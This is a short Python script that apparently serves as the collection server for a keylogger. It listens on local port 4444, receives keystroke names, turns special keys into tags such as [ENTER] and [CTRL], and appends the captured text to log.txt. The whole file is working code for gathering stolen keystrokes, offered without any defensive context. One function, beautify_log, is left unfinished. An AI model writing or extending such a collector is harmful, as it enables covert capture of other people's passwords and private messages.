import socket
import logging

BUFFER_SIZE = 10
SPECIAL_KEYS = {
    "Key.space": " ",
    "Key.enter": " [ENTER] ",
    "Key.tab": " [TAB] ",
    "Key.esc": " [ESC] ",
    "Key.shift": " [SHIFT] ",
    "Key.shift_r": " [SHIFT] ",
    "Key.ctrl": " [CTRL] ",
    "Key.ctrl_r": " [CTRL] ",
    "Key.alt": " [ALT] ",
    "Key.alt_r": " [ALT] ",
    "Key.backspace": " [BACKSPACE] ",
    "Key.delete": " [DEL] ",
    "Key.caps_lock": " [CAPSLOCK] ",
    "Key.cmd": " [WIN] ",
    "Key.cmd_r": " [WIN] ",
    "Key.up": " [UP] ",
    "Key.down": " [DOWN] ",
    "Key.left": " [LEFT] ",
    "Key.right": " [RIGHT] ",
}

def beautify_key(raw: str) -> str:
    raw = raw.strip().replace("'", "").replace('"', "")
    return SPECIAL_KEYS.get(raw, raw)

def beautify_log(filename):
    file = open(filename, 'r')


def main():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    buffer = ""
    output_file = open("log.txt", 'a', encoding="utf-8")

    host = '127.0.0.1'
    port = 4444

    server_socket.bind((host, port))
    server_socket.listen()

    conn, addr = server_socket.accept()
    
    while True:
        if len(buffer) <= BUFFER_SIZE:
            data = conn.recv(32)
            if data:
                decoded = data.decode("utf-8", errors="ignore")
                if not decoded:
                    continue
                beautified = beautify_key(decoded)
                if buffer.endswith(" ") and beautified.startswith(" "):
                    beautified = beautified.lstrip()
                buffer += beautified
            else:
                print("No data has been received")
                beautify_log("log.txt")
                break
        else:
            print(buffer)
            output_file.write(buffer.replace("'", ""))
            buffer = ""
    output_file.close()


if __name__ == "__main__":
    main()
